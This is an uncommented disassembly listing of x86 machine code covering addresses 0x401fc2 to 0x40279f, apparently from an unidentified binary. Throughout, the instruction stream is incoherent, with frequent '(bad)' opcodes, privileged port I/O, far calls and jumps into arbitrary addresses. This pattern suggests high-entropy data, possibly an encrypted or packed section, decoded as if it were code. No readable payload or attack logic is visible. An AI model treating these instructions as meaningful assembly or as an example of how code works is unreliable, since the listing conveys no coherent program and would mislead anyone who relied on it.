  401fc2:	pop    ebx
  401fc3:	xor    dl,BYTE PTR [edx]
  401fc5:	arpl   WORD PTR [ecx],si
  401fc7:	loop   0x401ffe
  401fc9:	repnz rcr BYTE PTR [edx+0x63],1
  401fcd:	lods   al,BYTE PTR ds:[esi]
  401fce:	jg     0x401f8a
  401fd0:	sub    DWORD PTR [ecx],0x6c
  401fd3:	xchg   edx,eax
  401fd4:	in     eax,dx
  401fd5:	xor    eax,0x20aff62
  401fda:	in     al,0x23
  401fdc:	shr    DWORD PTR [esi+0x37],cl
  401fdf:	in     al,dx
  401fe0:	or     ch,BYTE PTR [ecx+ebp*2]
  401fe3:	lods   eax,DWORD PTR ds:[esi]
  401fe4:	mov    al,0x18
  401fe6:	sbb    DWORD PTR [edx+0x4],ebp
  401fe9:	(bad)  
  401fea:	nop
  401feb:	pop    esi
  401fec:	js     0x401fd0
  401fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fef:	scas   al,BYTE PTR es:[edi]
  401ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff1:	xor    ah,BYTE PTR [ebx-0x63]
  401ff4:	fwait
  401ff5:	arpl   WORD PTR [esi-0x33],si
  401ff8:	jbe    0x402074
  401ffa:	scas   eax,DWORD PTR es:[edi]
  401ffb:	sar    dl,1
  401ffd:	in     eax,dx
  401ffe:	sub    ecx,ecx
  402000:	(bad)  
  402001:	stc    
  402002:	push   0xffffffdd
  402004:	ins    DWORD PTR es:[edi],dx
  402005:	and    ebp,DWORD PTR [esi+0x2c]
  402008:	adc    BYTE PTR [ecx+0x1b],0x29
  40200c:	inc    edi
  40200d:	xchg   esp,eax
  40200e:	not    DWORD PTR [edi+0x1d]
  402011:	jns    0x401f96
  402013:	push   edx
  402014:	sbb    DWORD PTR [edi-0x50b03662],ebp
  40201a:	lds    esp,FWORD PTR [esp+ebx*4+0x70]
  40201e:	call   0xa995:0x2fc59a2f
  402025:	jmp    0x402016
  402027:	push   edi
  402028:	pop    ebx
  402029:	jnp    0x401ff6
  40202b:	imul   esp,DWORD PTR [ebx-0x4ee93676],0xd6aa5897
  402035:	add    esi,DWORD PTR [ebx]
  402037:	arpl   dx,cx
  402039:	jg     0x402015
  40203b:	mov    dl,0x65
  40203d:	dec    esi
  40203e:	mov    dl,0x68
  402040:	pop    edx
  402041:	mov    ds,WORD PTR [edi+0x1b116d66]
  402047:	iret   
  402048:	mov    ah,0x2e
  40204a:	pop    edx
  40204b:	jns    0x402010
  40204d:	sar    ah,1
  40204f:	loop   0x402064
  402051:	mov    esp,0x5e5fb732
  402056:	dec    ecx
  402057:	fist   WORD PTR [edi]
  402059:	dec    ebp
  40205a:	arpl   ax,sp
  40205c:	daa    
  40205d:	mov    esp,DWORD PTR [ecx]
  40205f:	lods   eax,DWORD PTR ds:[esi]
  402060:	gs repz adc ecx,DWORD PTR ss:[ebx-0x755d7f8e]
  402069:	or     DWORD PTR [ebx+ebx*2],ebx
  40206c:	les    eax,FWORD PTR [esp+edi*1+0x7c]
  402070:	push   0xffffffca
  402072:	and    eax,0x7129fde6
  402077:	shl    BYTE PTR [esi+0x3b],0x89
  40207b:	les    esi,FWORD PTR [eax-0x7720f1c8]
  402081:	lea    edi,[edi-0x1e5eace0]
  402087:	pop    edx
  402088:	dec    esi
  402089:	or     ebx,edi
  40208b:	inc    edx
  40208c:	jp     0x402077
  40208e:	inc    ebx
  40208f:	sbb    DWORD PTR [edx-0x25],0x71
  402093:	dec    edi
  402094:	cwd    
  402096:	lods   eax,DWORD PTR ds:[esi]
  402097:	adc    ebp,DWORD PTR [edi+0x5c]
  40209a:	ja     0x4020d3
  40209c:	test   eax,0xf48be225
  4020a1:	and    edi,edx
  4020a3:	adc    edi,0x82fc195d
  4020a9:	or     dl,0x73
  4020ac:	mov    ds:0x442238b2,al
  4020b1:	add    DWORD PTR [edi+0x53],edx
  4020b4:	mov    ds:0x99c18c9c,al
  4020b9:	cs loop 0x402098
  4020bc:	jne    0x4020ab
  4020be:	ins    DWORD PTR es:[edi],dx
  4020bf:	lods   al,BYTE PTR es:[esi]
  4020c1:	ins    BYTE PTR es:[edi],dx
  4020c2:	(bad)  
  4020c3:	mov    eax,0xb12fb48e
  4020c8:	pop    esi
  4020c9:	iret   
  4020ca:	mov    bl,0xb1
  4020cc:	dec    edi
  4020cd:	mov    esp,0xa2c3cb00
  4020d2:	popa   
  4020d3:	sbb    DWORD PTR [esi+0x1a],edi
  4020d6:	jge    0x402133
  4020d8:	jnp    0x402138
  4020da:	mov    dl,0xfd
  4020dc:	lds    esp,FWORD PTR ds:0x2d585c7f
  4020e2:	gs in  eax,dx
  4020e4:	pop    ss
  4020e5:	in     eax,0x60
  4020e7:	idiv   BYTE PTR [ecx-0x1]
  4020ea:	(bad)  
  4020eb:	out    0xa5,eax
  4020ed:	mov    edi,ds
  4020ef:	or     BYTE PTR [ebp+0x50f4876],0x3b
  4020f6:	call   0xc67aff6f
  4020fb:	adc    al,bl
  4020fd:	pop    ds
  4020fe:	sub    al,0x4e
  402100:	fnstsw WORD PTR [edi-0x3]
  402103:	lock or eax,0x3f7c057f
  402109:	mov    ch,0xda
  40210b:	pushf  
  40210c:	xchg   ecx,eax
  40210d:	jp     0x40210f
  40210f:	pop    ss
  402110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402111:	add    BYTE PTR [ecx-0x36dceaba],0xfb
  402118:	inc    ebp
  402119:	loope  0x402120
  40211b:	mov    dh,0xca
  40211d:	aaa    
  40211e:	add    DWORD PTR [ecx-0x57efdcbc],edx
  402124:	shl    DWORD PTR [esi-0x45],1
  402127:	(bad)  
  402128:	aas    
  402129:	mov    BYTE PTR [edi-0x17],cl
  40212c:	mov    al,0x75
  40212e:	push   esp
  40212f:	cwde   
  402130:	out    dx,eax
  402131:	xchg   esi,eax
  402132:	push   edi
  402133:	pop    ebp
  402134:	xor    BYTE PTR [eax+0x6cd51da1],0x3d
  40213b:	xor    DWORD PTR [eax+edi*8+0x25c51fb1],ebp
  402142:	push   edi
  402143:	iret   
  402144:	mov    BYTE PTR [eax],dh
  402146:	cmp    al,0xc3
  402148:	dec    eax
  402149:	cmp    eax,0xcd55de5c
  40214e:	xor    bl,BYTE PTR [ebp+0x59]
  402151:	push   ds
  402152:	mov    ds:0x9f85ba8d,al
  402157:	jne    0x4020e2
  402159:	ss in  eax,0x16
  40215c:	out    dx,al
  40215d:	xchg   ebp,eax
  40215e:	pop    esi
  40215f:	cmp    al,0x4b
  402161:	sbb    esi,0x58
  402164:	imul   eax,DWORD PTR [ecx],0x3c76ddd
  40216a:	push   0x4b2b5506
  40216f:	dec    BYTE PTR [ecx-0xb80390b]
  402175:	je     0x40213f
  402177:	jb     0x402105
  402179:	inc    edi
  40217a:	lahf   
  40217b:	cmp    bh,0x8
  40217e:	or     BYTE PTR [ebx],0x3a
  402181:	jnp    0x40211b
  402183:	ror    DWORD PTR [ecx+0xdd9ddc6],1
  402189:	mov    al,0x46
  40218b:	(bad)  
  40218c:	pop    ebp
  40218d:	push   edi
  40218e:	xchg   ebp,eax
  40218f:	xchg   ebx,eax
  402190:	or     ah,BYTE PTR [esi]
  402192:	jno    0x4021d9
  402194:	mov    ds:0xdd23701d,eax
  402199:	jmp    0xb47d7e25
  40219e:	fsin   
  4021a0:	push   ecx
  4021a1:	mov    dl,0xdc
  4021a3:	xchg   ecx,eax
  4021a4:	out    0xf3,eax
  4021a6:	jle    0x402212
  4021a8:	sbb    edi,DWORD PTR [eax-0x43264e87]
  4021ae:	ja     0x4021a5
  4021b0:	xchg   esi,eax
  4021b1:	xor    eax,DWORD PTR [edi]
  4021b3:	mov    DWORD PTR ss:[ebx+0x5ccf112d],edi
  4021ba:	adc    DWORD PTR [esi],eax
  4021bc:	jmp    0x6da4eca9
  4021c1:	ret    
  4021c2:	xchg   esp,eax
  4021c3:	cmp    BYTE PTR [ebx],bl
  4021c5:	repnz lahf 
  4021c7:	or     BYTE PTR [ecx-0x2b],0x0
  4021cb:	cld    
  4021cc:	imul   ebp,DWORD PTR [edx],0x197f6e43
  4021d2:	push   edi
  4021d3:	lods   eax,DWORD PTR ds:[esi]
  4021d4:	push   0x7b
  4021d6:	fs xor eax,0x14fd5dcd
  4021dc:	dec    ebp
  4021dd:	xor    BYTE PTR [eax],bl
  4021df:	xchg   BYTE PTR [ebx+0x458550ec],dh
  4021e5:	push   0xb8f4320d
  4021ea:	push   esi
  4021eb:	inc    esi
  4021ec:	call   0x4fe8:0xebefc546
  4021f3:	dec    ebx
  4021f4:	gs inc edi
  4021f6:	xor    DWORD PTR [ecx+0x20],esi
  4021f9:	in     al,dx
  4021fa:	jae    0x4021ec
  4021fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021fd:	clc    
  4021fe:	pusha  
  4021ff:	jne    0x4021fc
  402201:	jnp    0x402209
  402203:	jbe    0x4021ec
  402205:	inc    esi
  402206:	mov    bl,0x5a
  402208:	retf   
  402209:	inc    ebx
  40220a:	mov    ecx,0x3a3c3509
  40220f:	dec    ecx
  402210:	idiv   ebp
  402212:	push   ecx
  402213:	xor    edx,DWORD PTR [edi+0x27]
  402216:	jle    0x4021b1
  402218:	and    ch,BYTE PTR [edx-0x16]
  40221b:	xchg   ebx,eax
  40221c:	das    
  40221d:	cmp    BYTE PTR [eax-0x32],0xc4
  402221:	sar    BYTE PTR cs:[edi],cl
  402224:	mov    esp,0x1464a312
  402229:	cmp    eax,0x82fb8f24
  40222e:	mov    bl,0xdf
  402230:	sub    DWORD PTR [ecx],0x38
  402233:	push   ds
  402234:	jae    0x4021f4
  402236:	repz sahf 
  402238:	pop    ebx
  402239:	inc    esi
  40223a:	xor    DWORD PTR [eax+0x66],edx
  40223d:	xor    BYTE PTR [edx-0x254c9727],bh
  402243:	sbb    al,0x9c
  402245:	jno    0x402295
  402247:	jmp    0x83e5:0xb14fdee5
  40224e:	mov    ebx,0x53a66fe2
  402253:	dec    ebx
  402254:	push   0xe28fafb5
  402259:	loop   0x40226b
  40225b:	cmp    BYTE PTR [eax+0x43],0xec
  40225f:	ds jge 0x4022cd
  402262:	pop    ds
  402263:	imul   ebx,DWORD PTR [ebx],0x4e
  402266:	add    ecx,edi
  402268:	shr    DWORD PTR [edi],0xa2
  40226b:	mov    edx,0xb2be09c2
  402270:	pop    edx
  402271:	out    dx,al
  402272:	enter  0x57c8,0xcc
  402276:	ret    
  402277:	jl     0x40221e
  402279:	(bad)  
  40227a:	xchg   ebp,eax
  40227b:	sbb    al,BYTE PTR [esi+0x22]
  40227e:	xchg   DWORD PTR [esi+0x7d524400],ecx
  402284:	sahf   
  402285:	push   ebp
  402286:	lock pop ebx
  402288:	cwde   
  402289:	mov    ebx,0x33c1f182
  40228e:	inc    ebx
  40228f:	mov    al,0x0
  402291:	cmp    DWORD PTR ds:0x5cf9f601,ebx
  402297:	imul   ebp,DWORD PTR [edx+0x4d],0x5896dddf
  40229e:	jle    0x402309
  4022a0:	das    
  4022a1:	int3   
  4022a2:	inc    ebx
  4022a3:	call   0x44fc5a87
  4022a8:	pop    edi
  4022a9:	pop    esi
  4022aa:	std    
  4022ab:	xchg   ebx,eax
  4022ac:	fmul   QWORD PTR ds:0x5f0bbe1c
  4022b2:	jecxz  0x402238
  4022b4:	push   esp
  4022b5:	jge    0x4022b1
  4022b7:	mov    DWORD PTR [edi],esi
  4022b9:	fistp  WORD PTR [edx-0x111fb401]
  4022bf:	and    DWORD PTR [edi-0x79],0x22
  4022c3:	fcomp  DWORD PTR [esp+edi*1+0x77bf415a]
  4022ca:	jge    0x40233f
  4022cc:	or     DWORD PTR [ebp+0x52],ebx
  4022cf:	sbb    BYTE PTR [ebx+ebx*4+0x2456c98b],dh
  4022d6:	(bad)  
  4022d7:	sbb    DWORD PTR [ebx+0x6c],ebp
  4022da:	stc    
  4022db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022dc:	mov    dl,0xfe
  4022de:	ins    DWORD PTR es:[edi],dx
  4022df:	xchg   ecx,eax
  4022e0:	push   0xd11cc1c5
  4022e5:	sbb    esi,DWORD PTR [esi]
  4022e7:	lahf   
  4022e8:	dec    ebx
  4022e9:	lds    ebp,FWORD PTR [ebp-0x25ef3f10]
  4022ef:	cmp    ebp,eax
  4022f1:	out    dx,al
  4022f2:	ficom  WORD PTR [ebp-0x63207413]
  4022f8:	and    al,0xf1
  4022fa:	ds aam 0x64
  4022fd:	pop    edi
  4022fe:	shr    BYTE PTR [ebp-0x1a],0x21
  402302:	popa   
  402303:	ret    0x9f07
  402306:	inc    edi
  402307:	stos   DWORD PTR es:[edi],eax
  402308:	xchg   ebp,eax
  402309:	mov    WORD PTR [edi],?
  40230b:	dec    esp
  40230c:	jne    0x402310
  40230e:	cli    
  40230f:	mov    esp,0x8eb175ac
  402314:	xchg   dh,dl
  402316:	leave  
  402317:	push   esi
  402318:	fild   QWORD PTR [ebx+0x4c]
  40231b:	dec    edi
  40231c:	jo     0x402396
  40231e:	xchg   ebp,eax
  40231f:	jno    0x40230e
  402321:	inc    ebx
  402322:	retf   
  402323:	(bad)  [ebp-0x24]
  402326:	add    dl,bl
  402328:	xor    cl,al
  40232a:	loope  0x4022cd
  40232c:	and    BYTE PTR [eax+0x656442f3],0x22
  402333:	sti    
  402334:	sub    al,BYTE PTR [edi+eax*8]
  402337:	loopne 0x402309
  402339:	add    DWORD PTR [esi+ebp*8+0x2c],edx
  40233d:	jbe    0x4022d0
  40233f:	xor    esi,DWORD PTR ds:0x2cca79fa
  402345:	fistp  WORD PTR [esi]
  402347:	retf   0x803b
  40234a:	stos   DWORD PTR es:[edi],eax
  40234b:	(bad)  
  40234c:	and    eax,0x5a4ee932
  402351:	jge    0x4022d3
  402353:	mov    edi,0x4a02c96a
  402358:	mov    eax,ebp
  40235a:	push   cs
  40235b:	sti    
  40235c:	test   BYTE PTR gs:[ebx+0x33f8b0ba],cl
  402363:	es jnp 0x4023e0
  402366:	psubusw mm2,QWORD PTR [edi-0x230c7974]
  40236d:	shr    DWORD PTR [edx-0x55670f36],1
  402373:	cmp    eax,0x17358af7
  402378:	cdq    
  402379:	jmp    0x402352
  40237b:	mov    al,ch
  40237d:	or     eax,0x4207b7ae
  402382:	inc    esp
  402383:	push   0xffffff97
  402385:	lock fist DWORD PTR [edx+0x5d]
  402389:	or     ch,bh
  40238b:	(bad)  
  40238c:	dec    edi
  40238d:	(bad)  
  40238e:	mov    DWORD PTR [edi],edx
  402390:	(bad)  
  402391:	popf   
  402392:	add    eax,0x36122867
  402397:	xchg   esp,eax
  402398:	(bad)  
  402399:	into   
  40239a:	sub    al,0x4b
  40239c:	into   
  40239d:	push   ebx
  40239e:	enter  0x5f,0xc9
  4023a2:	out    0x79,eax
  4023a4:	jmp    0xde36:0xedd858c9
  4023ab:	sbb    DWORD PTR [edi+esi*1-0x5c],esp
  4023af:	gs int 0x58
  4023b2:	out    dx,al
  4023b3:	push   ds
  4023b4:	jae    0x40238e
  4023b6:	aas    
  4023b7:	daa    
  4023b8:	out    dx,eax
  4023b9:	adc    al,0xea
  4023bb:	nop
  4023bc:	jecxz  0x4023e6
  4023be:	inc    eax
  4023bf:	inc    edx
  4023c0:	xchg   ebp,eax
  4023c1:	loop   0x4023e9
  4023c3:	neg    BYTE PTR [eax+0x6fc4dabc]
  4023c9:	xchg   ebx,eax
  4023ca:	dec    ecx
  4023cb:	xchg   BYTE PTR [ecx],ch
  4023cd:	adc    eax,0xd7e0c63d
  4023d2:	lea    edi,[ebx]
  4023d4:	push   0x52bd5b8a
  4023d9:	lds    ecx,FWORD PTR [ecx]
  4023db:	fnstenv [edi-0x66312e10]
  4023e1:	xor    BYTE PTR [ebp+0xb],0x1e
  4023e5:	xchg   ecx,eax
  4023e6:	vsubps ymm4,ymm0,YMMWORD PTR [edi-0x66]
  4023eb:	mov    ch,0xd8
  4023ed:	pop    ss
  4023ee:	out    0xd4,eax
  4023f0:	pop    eax
  4023f1:	fdivr  DWORD PTR [edx-0x4a531044]
  4023f7:	add    eax,0xf4317e90
  4023fc:	paddw  mm4,QWORD PTR [edi+ecx*4+0x575920e2]
  402404:	cmp    BYTE PTR [edx],dh
  402406:	mov    esi,0x52031b24
  40240b:	jge    0x4023ca
  40240d:	sahf   
  40240e:	sub    BYTE PTR [ebp+0xe],dh
  402411:	jecxz  0x402484
  402413:	pusha  
  402414:	(bad)  [ebp+0x252b9c5b]
  40241a:	ja     0x40239e
  40241c:	fstp   DWORD PTR [ebx+0x6d]
  40241f:	test   eax,0xabe59bf3
  402424:	inc    esi
  402425:	out    0x8e,eax
  402427:	pop    eax
  402428:	add    BYTE PTR [ebx-0x4a],dh
  40242b:	dec    edx
  40242c:	inc    eax
  40242d:	mov    ebp,DWORD PTR [ebp+0x22]
  402430:	loope  0x40247a
  402432:	or     al,0xbc
  402434:	lock cmp DWORD PTR [esi],eax
  402437:	in     al,dx
  402438:	cmp    DWORD PTR [ebx+0x76],eax
  40243b:	cs jns 0x402496
  40243e:	ficom  DWORD PTR [ebx-0x45]
  402441:	or     ecx,eax
  402443:	or     eax,0x4b0d23f9
  402448:	push   ecx
  402449:	hlt    
  40244a:	inc    edi
  40244b:	loop   0x402488
  40244d:	shr    DWORD PTR [edx-0x3ab2e33d],0x64
  402454:	push   ss
  402455:	jmp    0x402442
  402457:	push   ss
  402458:	imul   eax,DWORD PTR [ecx+0x7325f4bc],0x6a760c5e
  402462:	sti    
  402463:	(bad)  [ecx*4-0x1580bcaf]
  40246a:	shr    BYTE PTR [ebx+0x3c],1
  40246d:	fisttp QWORD PTR [edx-0x5c475dad]
  402473:	stos   DWORD PTR es:[edi],eax
  402474:	sti    
  402475:	cmc    
  402476:	mov    bh,0x35
  402478:	mov    eax,DWORD PTR [esi]
  40247a:	jg     0x4024de
  40247c:	(bad)  
  40247d:	rcl    BYTE PTR [ebp-0x6f],cl
  402480:	out    dx,eax
  402481:	adc    al,0x55
  402483:	loope  0x4024e8
  402485:	dec    edx
  402486:	push   0xffffff91
  402488:	dec    esi
  402489:	mov    edi,0xfd21332f
  40248e:	inc    edx
  40248f:	mov    ch,0xb0
  402491:	dec    ebp
  402492:	mov    edi,0xecc9e02e
  402497:	xchg   edx,eax
  402498:	mov    edi,0x3df6abcd
  40249d:	push   0xf99b50d1
  4024a2:	cli    
  4024a3:	pop    edx
  4024a4:	mov    dh,0xd7
  4024a6:	fstp   QWORD PTR [ebp+0x4f]
  4024a9:	sbb    ah,BYTE PTR [eax]
  4024ab:	mov    cl,0x16
  4024ad:	lea    ebp,[eax]
  4024af:	bound  esi,QWORD PTR [edi-0x518aed90]
  4024b5:	popa   
  4024b6:	push   ds
  4024b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024b8:	xor    al,0x23
  4024ba:	sub    eax,edx
  4024bc:	fild   QWORD PTR [edx]
  4024be:	jecxz  0x402533
  4024c0:	(bad)  
  4024c2:	and    al,0x16
  4024c4:	sub    bh,BYTE PTR [esi]
  4024c6:	test   al,0xac
  4024c8:	push   edx
  4024c9:	enter  0x3c44,0x99
  4024cd:	mov    edi,0xa82a4fd5
  4024d2:	lea    edx,[edi]
  4024d4:	and    edi,DWORD PTR [ebx+0x34c4cff0]
  4024da:	test   al,0x88
  4024dc:	arpl   WORD PTR [esi+0xfd4f081],sp
  4024e2:	scas   al,BYTE PTR es:[edi]
  4024e3:	pop    ebp
  4024e4:	jo     0x402549
  4024e6:	pop    ds
  4024e7:	gs jbe 0x40253f
  4024ea:	nop
  4024eb:	or     eax,0xfde95ccf
  4024f0:	inc    esi
  4024f1:	mov    al,ds:0x4226adbd
  4024f6:	or     BYTE PTR [edx],ch
  4024f8:	lods   eax,DWORD PTR ds:[esi]
  4024f9:	mov    cl,0xc9
  4024fb:	in     al,dx
  4024fc:	adc    cl,BYTE PTR [ebx-0x628cd55b]
  402502:	or     al,0xa1
  402504:	ror    DWORD PTR [edx+0xd57c814],1
  40250a:	jb     0x402497
  40250c:	sub    ebx,edi
  40250e:	fcomp  QWORD PTR ds:0x689d2b0d
  402514:	ret    
  402515:	stc    
  402516:	xchg   esp,eax
  402517:	mov    ds:0xddd7a96a,al
  40251c:	pop    edi
  40251d:	mov    es,esp
  40251f:	jns    0x4024a2
  402521:	das    
  402522:	adc    al,BYTE PTR ds:0x7884664a
  402528:	fmul   QWORD PTR [ecx+0x53]
  40252b:	jecxz  0x4024e5
  40252d:	fidivr WORD PTR [esi+0xd]
  402530:	and    ebp,esi
  402532:	cld    
  402533:	pop    esi
  402534:	test   DWORD PTR [edx+0x1f],edx
  402537:	bswap  eax
  402539:	pusha  
  40253a:	sub    al,0x3d
  40253c:	fdivr  DWORD PTR [ecx-0x6c]
  40253f:	stos   BYTE PTR es:[edi],al
  402540:	add    BYTE PTR [ecx],dh
  402542:	call   0xbd63:0x31bb9d31
  402549:	ds sbb edi,ebp
  40254c:	sbb    al,0x69
  40254e:	xchg   esp,eax
  40254f:	push   eax
  402550:	push   ss
  402551:	mov    ch,0x7b
  402553:	jg     0x4024d5
  402555:	call   edi
  402557:	loopne 0x40256c
  402559:	shl    DWORD PTR [edx+0x278a5c0],cl
  40255f:	les    ecx,FWORD PTR [ecx+eiz*8+0xf22ed3f]
  402566:	rcl    DWORD PTR [eax+0x3],cl
  402569:	sbb    BYTE PTR [eax-0x19ef2249],dh
  40256f:	fst    QWORD PTR [ebp+0x46]
  402572:	data16 jl 0x402556
  402575:	mul    BYTE PTR [esi]
  402577:	mov    ds:0xb4060db,eax
  40257c:	push   0x18
  40257e:	test   BYTE PTR [edx-0x50],0xef
  402582:	xor    esp,edi
  402584:	(bad)  
  402585:	call   0xa2b14794
  40258a:	inc    ebx
  40258b:	inc    ebx
  40258c:	push   ebp
  40258d:	f2xm1  
  40258f:	add    BYTE PTR [eax+eax*2-0x2b398a0f],ah
  402596:	jmp    0xe82047c0
  40259b:	adc    al,0x33
  40259e:	push   es
  40259f:	ret    
  4025a0:	jno    0x4025cb
  4025a2:	push   ecx
  4025a3:	sbb    DWORD PTR [eax-0x10],0xffffffd8
  4025a7:	leave  
  4025a8:	ret    0x229a
  4025ab:	les    ecx,FWORD PTR [ebx-0x40b1966e]
  4025b1:	pop    esp
  4025b2:	xchg   ebx,eax
  4025b3:	lods   al,BYTE PTR ds:[esi]
  4025b4:	call   0x96392e95
  4025b9:	mov    eax,DWORD PTR [ecx+0x45b3e1e]
  4025bf:	test   DWORD PTR [edi+ebx*2-0x422b9ad4],ebx
  4025c6:	pop    ds
  4025c7:	sbb    DWORD PTR [edi+0x5e],esp
  4025ca:	pusha  
  4025cb:	out    0x6a,ax
  4025ce:	es mov bh,0x5c
  4025d1:	out    0x3e,al
  4025d3:	or     cl,ah
  4025d5:	hlt    
  4025d6:	aaa    
  4025d7:	mov    DWORD PTR [esi-0x580b16b2],eax
  4025dd:	cwde   
  4025de:	xor    BYTE PTR ds:0xe6728c12,ch
  4025e4:	mov    ecx,0x8004ae21
  4025e9:	mov    dl,0x9e
  4025eb:	ins    BYTE PTR es:[edi],dx
  4025ec:	mov    dh,0x4c
  4025ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ef:	xor    BYTE PTR [edx],ch
  4025f1:	loope  0x4025f6
  4025f3:	ss cwde 
  4025f5:	(bad)
  4025f9:	cld    
  4025fa:	sbb    bh,ah
  4025fc:	in     al,dx
  4025fd:	xor    bh,bh
  4025ff:	push   cs
  402600:	lea    edi,[edx]
  402602:	hlt    
  402603:	inc    esi
  402604:	add    al,bh
  402606:	les    ebx,FWORD PTR [esi-0x23]
  402609:	xchg   ebp,eax
  40260a:	cli    
  40260b:	xchg   ebx,eax
  40260c:	xchg   edx,eax
  40260d:	ins    BYTE PTR es:[edi],dx
  40260e:	sub    ebx,DWORD PTR ds:0xeb30b0cd
  402614:	push   esi
  402615:	sahf   
  402616:	jbe    0x4025b6
  402618:	out    0x3a,al
  40261a:	pop    ecx
  40261b:	scas   al,BYTE PTR es:[edi]
  40261c:	cs inc edx
  40261e:	inc    edx
  40261f:	in     eax,dx
  402620:	sbb    ebp,DWORD PTR [ecx+0x37]
  402623:	ds addr16 adc al,0x59
  402627:	(bad)  
  402628:	int    0x5
  40262a:	sub    dl,BYTE PTR [eax+0xd652c2f]
  402630:	xor    BYTE PTR [ebp-0x2d],al
  402633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402634:	add    al,0xa7
  402636:	je     0x402645
  402638:	push   ebx
  402639:	xor    eax,0x46e71528
  40263e:	inc    ebx
  40263f:	cmc    
  402640:	rcl    DWORD PTR [eax],cl
  402642:	cmp    ah,BYTE PTR [eax]
  402644:	loop   0x4026b7
  402646:	jp     0x40265a
  402648:	pushf  
  402649:	inc    edi
  40264a:	ret    0x2ffb
  40264d:	int    0x83
  40264f:	dec    edi
  402650:	loop   0x402662
  402652:	mov    gs,WORD PTR [ebp-0x5f83896d]
  402658:	fsubr  st(4),st
  40265a:	shl    BYTE PTR [ebx],1
  40265c:	jmp    0xa3396ce3
  402661:	fild   WORD PTR [eax+0x26]
  402664:	push   0xb3e008b3
  402669:	jge    0x40269f
  40266b:	adc    dl,dl
  40266d:	repz sub esp,DWORD PTR [ebp-0x4b17ccec]
  402674:	xchg   esi,eax
  402675:	jg     0x402640
  402677:	std    
  402678:	ficomp DWORD PTR [esi+0x7f]
  40267b:	add    al,0x50
  40267d:	and    eax,0x20da80f7
  402682:	(bad)  
  402683:	or     eax,0x53d59228
  402688:	pop    ebx
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    esi
  40268b:	in     al,dx
  40268c:	and    ebx,0xffffffc2
  40268f:	push   ds
  402690:	and    esi,edx
  402692:	mov    esi,0x64dd6fc1
  402697:	cdq    
  402698:	cdq    
  402699:	push   ebx
  40269a:	in     al,0xda
  40269c:	ins    DWORD PTR es:[edi],dx
  40269d:	adc    ebx,DWORD PTR [ebp+0x41]
  4026a0:	xor    eax,0xa2a6e898
  4026a6:	pushf  
  4026a7:	call   0x3a0839d
  4026ac:	cmc    
  4026ad:	jmp    FWORD PTR [esi]
  4026af:	mov    ecx,0x30a33434
  4026b4:	out    dx,eax
  4026b5:	ds (bad) 
  4026b7:	xor    eax,0x7317df58
  4026bc:	ror    BYTE PTR fs:[eax],0x6e
  4026c0:	vunpcklps ymm2,ymm5,YMMWORD PTR [edi-0x4615241]
  4026c8:	jbe    0x4026ca
  4026ca:	pop    edi
  4026cb:	lock (bad) 
  4026cd:	nop
  4026ce:	cmp    eax,0xb078392a
  4026d3:	jo     0x4026e6
  4026d5:	ja     0x40268f
  4026d7:	les    ecx,FWORD PTR ds:0x842a13ef
  4026dd:	sbb    ebp,DWORD PTR [edx]
  4026df:	lods   al,BYTE PTR ds:[esi]
  4026e0:	adc    esp,DWORD PTR [edx+0x53]
  4026e3:	pop    esi
  4026e4:	mov    ebx,0x6a1f4fdb
  4026e9:	inc    DWORD PTR [ebp+0x69]
  4026ec:	dec    edx
  4026ed:	dec    ecx
  4026ee:	lods   eax,DWORD PTR ds:[esi]
  4026ef:	enter  0x76ed,0x33
  4026f3:	ret    0x2291
  4026f6:	outs   dx,DWORD PTR ds:[esi]
  4026f7:	dec    edx
  4026f8:	ss imul ecx,ecx,0x6f
  4026fc:	mov    dl,0x19
  4026fe:	outs   dx,BYTE PTR ds:[esi]
  4026ff:	fst    QWORD PTR [ebx+esi*1+0x6eafc0ff]
  402706:	add    BYTE PTR ds:0xba6933c6,dh
  40270c:	inc    esi
  40270d:	(bad)
  402710:	pop    ecx
  402711:	mov    ah,0x9f
  402713:	aad    0x40
  402715:	mov    esi,0x9345fe50
  40271a:	stos   BYTE PTR es:[edi],al
  40271b:	jge    0x4026a3
  40271d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40271e:	loop   0x402726
  402720:	aam    0x50
  402722:	sbb    BYTE PTR [eax+0x54d5b953],al
  402728:	je     0x40271b
  40272a:	daa    
  40272b:	cmp    DWORD PTR [ebp+0x4b],0x584a5057
  402732:	sbb    edi,DWORD PTR [ebx-0x54]
  402735:	mov    al,ds:0xbb0a71cc
  40273a:	xor    al,BYTE PTR [ecx+edi*8+0x131b101]
  402741:	jmp    0x686c95c7
  402746:	xchg   ah,dh
  402748:	repz sub DWORD PTR [edi+0x5f06bc98],0x44a1e0be
  402753:	lods   al,BYTE PTR ds:[esi]
  402754:	adc    bh,dh
  402756:	scas   al,BYTE PTR es:[edi]
  402757:	pop    ds
  402758:	sub    bl,dl
  40275a:	add    eax,0xd2033463
  40275f:	mov    ah,0xbf
  402761:	fcom   st(2)
  402763:	not    DWORD PTR [ebp-0x33]
  402766:	cmp    DWORD PTR [ebx],ebx
  402768:	adc    al,0xb9
  40276a:	int3   
  40276b:	scas   eax,DWORD PTR es:[edi]
  40276c:	pop    edi
  40276d:	xchg   bh,bl
  40276f:	lea    edi,[edx]
  402771:	dec    ebx
  402772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402773:	add    ebp,eax
  402775:	shl    BYTE PTR [esi+0x628e0ce],0x42
  40277c:	adc    DWORD PTR [esi-0x47],0xffffffde
  402780:	sbb    ch,BYTE PTR [ebx+ecx*2-0x34]
  402784:	dec    edi
  402785:	fild   DWORD PTR ss:[ecx-0x20]
  402789:	jne    0x402809
  40278b:	mov    ds:0x234ec247,eax
  402790:	cli    
  402791:	gs jmp 0x4027e4
  402794:	ja     0x402737
  402796:	leave  
  402797:	mov    bh,0x9
  402799:	inc    ebp
  40279a:	out    dx,al
  40279b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279c:	pop    es
  40279d:	repnz (bad) 
  40279f:	addr16 xor ecx,eax
